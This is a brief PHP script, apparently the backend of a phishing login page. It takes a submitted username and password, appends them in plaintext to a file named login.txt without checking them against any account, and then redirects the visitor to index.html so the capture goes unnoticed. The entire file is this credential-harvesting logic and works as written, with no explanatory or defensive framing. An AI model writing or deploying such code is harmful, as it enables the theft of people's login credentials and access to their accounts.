<?php
if(isset($_POST["inputUsername"]) && isset($_POST["inputPassword"])){
    $username = $_POST['inputUsername'];
    $password = $_POST['inputPassword'];
    file_put_contents('login.txt', "$username;$password\n", FILE_APPEND);
    header("location:index.html");
}
?>